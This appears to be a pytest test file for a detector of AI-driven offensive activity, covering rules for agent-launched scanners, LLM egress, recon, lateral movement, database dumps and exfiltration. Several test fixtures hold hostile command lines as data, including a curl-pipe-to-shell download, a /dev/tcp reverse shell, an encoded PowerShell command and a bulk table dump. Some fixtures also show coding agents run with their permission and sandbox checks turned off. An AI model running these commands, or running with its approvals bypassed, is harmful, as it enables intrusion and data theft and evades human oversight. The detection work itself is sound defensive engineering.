import random
from datetime import date

from app import offensive_ai as oa
from app.modules import threatintel

CSV = """type,value,confidence,context,actor,source,source_url,reported,review_by,framework
user_agent,HexStrike-HTTP-Framework/1.0,high,ua,,Elastic,https://x,2026-10-01,,hexstrike
ipv4,192.0.2.66,medium,c2,,X,https://x,2026-01-01,2026-03-01,cyberstrikeai
ipv4,192.0.2.77,medium,c2,,X,https://x,2026-10-01,2027-04-01,cairn strix hermes
string,ZQ,low,short,,X,https://x,2026-10-01,,strix
string,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,medium,generic,,X,https://x,2026-10-01,,cyberstrikeai
"""


def det():
    return oa.Detector({("SRV-AI-01", "api.anthropic.com")})


def proc(pid, ppid, image, cmd, host="DEV-WS-118"):
    return {"kind": "process", "host": host, "user": "u", "pid": pid, "ppid": ppid, "image": image, "cmdline": cmd}


def rules(d, rec, now):
    return [r for r, _ in d.evaluate(rec, now)]


def test_parse_agentic_drops_expired_and_counts_frameworks():
    data = threatintel.parse_agentic(CSV, today=date(2026, 11, 22))
    assert data["total"] == 4 and data["expired"] == 1
    assert data["by_framework"]["hermes"] == 1 and data["items"][0]["value"].startswith("HexStrike")


def test_index_guards_against_generic_values():
    rows = threatintel.parse_agentic(CSV, today=date(2026, 11, 22))["rows"]
    idx = oa.IndicatorIndex(rows)
    browser = {"kind": "http", "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/130", "uri": "/ZQ"}
    assert idx.match(browser) == []
    assert [h["framework"] for h in idx.match({"kind": "http", "ua": "HexStrike-HTTP-Framework/1.0 (Advanced Security Testing)"})] == ["hexstrike"]
    assert idx.match({"kind": "net", "dest_ip": "192.0.2.77"})[0]["framework"] == "cairn strix hermes"


def test_yolo_agent_fanout_and_chain():
    d = det()
    assert rules(d, proc(10, 1, "claude", "claude --dangerously-skip-permissions -p 'pentest'"), 0) == []
    assert rules(d, proc(11, 10, "bash", "bash -c nmap"), 1) == []
    hits = []
    for i, (t, a) in enumerate([("nmap", "-sV"), ("nuclei", "-l x"), ("ffuf", "-u x"), ("netexec", "smb x")]):
        hits += rules(d, proc(20 + i, 11, t, f"{t} {a}"), 2 + i)
    assert hits.count("OAI-001") == 1 and "OAI-003" in hits and "OAI-005" in hits


def test_single_tool_without_agent_is_quiet():
    d = det()
    assert rules(d, proc(5, 1, "nmap.exe", "nmap -sn 10.0.3.0/24", host="IT-WS-003"), 0) == []


def test_llm_egress_servers_only_and_cn_severity():
    d = det()
    out = d.evaluate({"kind": "net", "host": "SRV-FILE-02", "dest": "api.deepseek.com", "port": 443}, 0)
    assert out[0][0] == "OAI-002" and out[0][1]["region"] == "CN" and out[0][1]["severity"] == "high"
    assert rules(d, {"kind": "net", "host": "SRV-AI-01", "dest": "api.anthropic.com"}, 0) == []
    assert rules(d, {"kind": "net", "host": "DEV-WS-102", "dest": "api.deepseek.com"}, 0) == []
    assert rules(d, {"kind": "net", "host": "SRV-WEB-01", "dest": "abc123.oast.fun", "port": 53}, 0) == ["OAI-007"]


def test_rotating_proxy_recon():
    d = det()
    hits = []
    for i in range(25):
        hits += rules(d, {"kind": "http", "dst_host": "SRV-WEB-01", "src_ip": f"203.0.113.{i}", "uri": "/admin",
                          "status": 404, "method": "GET", "ua": "x"}, i)
    assert hits.count("OAI-004") == 1
    d2 = det()  # one IP hammering is not the rotating-proxy pattern
    assert not any(rules(d2, {"kind": "http", "dst_host": "W", "src_ip": "1.2.3.4", "uri": "/a", "status": 404,
                              "method": "GET", "ua": "x"}, i) for i in range(40))


def test_monitor_end_to_end_simulation():
    m = oa.OffensiveAIMonitor(random.Random(3))
    alerts = []
    for i in range(4000):
        alerts += m.step(1000.0 + i)
    fired = {r for r, n in m.rule_hits.items() if n}
    assert {"OAI-001", "OAI-002", "OAI-003", "OAI-004", "OAI-005", "OAI-006", "OAI-007"} <= fired
    assert all(a["extra"]["detector"] == "offensive-ai" for a in alerts)
    cn = [a for a in alerts if a["extra"].get("region") == "CN"]
    assert cn and all(a["spec"][2] == "high" for a in cn)
    assert {f["id"] for f in m.summary()["frameworks"]} == set(oa.FRAMEWORKS)


def test_rotating_proxy_detected_amid_normal_traffic():
    d = det()
    hits = []
    for i in range(300):  # busy site: 300 normal visitors
        hits += rules(d, {"kind": "http", "dst_host": "W", "src_ip": f"10.1.{i // 200}.{i % 200}", "uri": "/",
                          "status": 200, "method": "GET", "ua": "x"}, i * 0.5)
    for i in range(22):
        hits += rules(d, {"kind": "http", "dst_host": "W", "src_ip": f"203.0.113.{i}", "uri": "/admin",
                          "status": 404, "method": "GET", "ua": "x"}, 150 + i)
    assert hits.count("OAI-004") == 1


# ---------- use cases: recon burst, lateral fan-out, DB access & exfil ----------
def test_web_api_recon_burst_single_source():
    d = det()
    hits = []
    for i in range(70):
        hits += rules(d, {"kind": "http", "dst_host": "API-1", "src_ip": "198.51.100.9", "method": "GET",
                          "uri": f"/api/v1/item/{i}", "status": 404, "ua": "x"}, i * 0.5)
    assert hits.count("OAI-008") == 1
    d2 = det()  # a busy legitimate client: same paths, all 200
    assert not any("OAI-008" in rules(d2, {"kind": "http", "dst_host": "API-1", "src_ip": "10.0.0.5", "method": "GET",
                                             "uri": "/api/v1/status", "status": 200, "ua": "x"}, i * 0.5) for i in range(100))


def test_lateral_fanout_from_smb_and_logons():
    d = det()
    hits = []
    for i in range(12):
        hits += rules(d, {"kind": "net", "host": "WS-7", "dest_ip": f"10.0.5.{i + 2}", "port": 445}, i)
    assert hits.count("OAI-009") == 1
    d2 = det()
    hits = []
    for i in range(11):
        hits += rules(d2, {"kind": "logon", "dest_host": f"SRV-{i}", "src_host": "WS-9", "user": "it.admin",
                           "event_id": 4624, "logon_type": 3}, i)
    assert hits.count("OAI-009") == 2  # by source machine and by account
    d3 = det()  # interactive logons and few hosts stay quiet
    assert not any(rules(d3, {"kind": "logon", "dest_host": f"H{i % 3}", "src_host": "WS-1", "event_id": 4624,
                              "logon_type": 3}, i) for i in range(30))


def test_db_dump_bulk_and_exfil_chain():
    d = det()
    out = d.evaluate({"kind": "db", "host": "SRV-SQL-01", "user": "app_ro", "client_host": "WS-22",
                      "statement": "SELECT * FROM customers INTO OUTFILE '/tmp/c.csv'"}, 0)
    assert out[0][0] == "OAI-010" and out[0][1]["reason"].startswith("dump")
    hits = []
    for i in range(3):
        hits += rules(d, {"kind": "db", "host": "SRV-SQL-01", "user": "app_ro", "statement": "select * from orders",
                          "rows": 40_000}, 10 + i)
    assert hits == ["OAI-010"]
    ex = d.evaluate({"kind": "dlp", "user": "app_ro", "host": "WS-22", "dest": "drive.example-share.com",
                     "channel": "web-upload", "bytes": 80_000_000, "action": "allowed"}, 600)
    assert ex[0][0] == "OAI-011" and ex[0][1]["severity"] == "critical" and ex[0][1]["after_bulk_access"]
    d2 = det()  # sensitive DLP event alone -> high; blocked or internal -> nothing
    assert d2.evaluate({"kind": "dlp", "user": "u", "dest": "x.example", "classification": "Confidential"}, 0)[0][1]["severity"] == "high"
    assert d2.evaluate({"kind": "dlp", "user": "v", "dest": "x.example", "classification": "pii", "action": "blocked"}, 0) == []
    assert d2.evaluate({"kind": "dlp", "user": "w", "dest": "x.example", "bytes": 10}, 0) == []


# ---------- framework focus behaviours ----------
def test_agent_swarm_oai012():
    d = det()
    hits = rules(d, proc(1, 0, "claude", "claude --dangerously-skip-permissions -p w1", host="SRV-9"), 0)
    hits += rules(d, proc(2, 0, "codex", "codex exec --dangerously-bypass-approvals-and-sandbox w2", host="SRV-9"), 5)
    assert hits == ["OAI-012"]
    d2 = det()  # one agent with approvals on is normal developer use
    assert rules(d2, proc(1, 0, "claude", "claude -p 'fix tests'"), 0) == []
    assert rules(d2, proc(2, 0, "codex", "codex exec 'refactor'"), 1) == []


def test_mcp_launched_tools_oai013():
    d = det()
    rules(d, proc(10, 1, "python3", "python3 hexstrike_server.py --port 8888"), 0)
    out = d.evaluate(proc(11, 10, "nmap", "nmap -sV 10.0.0.0/24"), 1)
    o13 = [x for r, x in out if r == "OAI-013"]
    assert o13 and o13[0]["severity"] == "critical" and o13[0]["framework"] == "hexstrike"
    d2 = det()
    rules(d2, proc(10, 1, "node", "node /opt/tools/mcp-server/index.js"), 0)
    out = d2.evaluate(proc(11, 10, "sqlmap", "sqlmap -u x"), 1)
    assert [x.get("severity") for r, x in out if r == "OAI-013"] == [None]  # default high


def test_agent_dynamic_code_oai014():
    d = det()
    rules(d, proc(20, 1, "python3", "python3 run_ui.py --agent agent-zero"), 0)
    assert "OAI-014" in rules(d, proc(21, 20, "bash", "bash -c 'curl -s https://x.example/a.sh | sh'"), 1)
    out = d.evaluate(proc(22, 20, "bash", "bash -c 'bash -i >& /dev/tcp/198.51.100.7/4444 0>&1'"), 2)
    assert [x["severity"] for r, x in out if r == "OAI-014"] == ["critical"]
    d2 = det()  # same command without an agent ancestor is left to other rules
    assert rules(d2, proc(30, 1, "bash", "bash -c 'curl -s https://x.example/a.sh | sh'"), 0) == []
    d3 = det()  # parent fields on an EDR row are enough
    rec = proc(40, 39, "powershell.exe", "powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA")
    rec.update(parent_image="hermes", parent_cmdline="hermes chat --yolo")
    assert "OAI-014" in rules(d3, rec, 0)


def test_framework_cards_and_antifox():
    m = oa.OffensiveAIMonitor(random.Random(1))
    fw = {f["id"]: f for f in m.summary()["frameworks"]}
    assert set(fw) == {"artex", "antifox", "cairn", "pentagi", "hexstrike", "cyberstrikeai", "strix", "hermes", "agent-zero"}
    assert fw["hexstrike"]["focus"].startswith("MCP") and [r["id"] for r in fw["hexstrike"]["rules"]][0] == "OAI-013"
    idx = oa.IndicatorIndex([{"type": "docker_image", "value": "ghcr.io/antifox-ai/antifox", "confidence": "high",
                              "framework": "artex", "context": "AntiFox fork image"}])
    d = det()
    d.index = idx
    out = d.evaluate({"kind": "process", "host": "H", "pid": 1, "ppid": 0, "image": "docker",
                      "cmdline": "docker run ghcr.io/antifox-ai/antifox"}, 0)
    assert [x["framework"] for r, x in out if r == "OAI-006"] == ["artex antifox"]
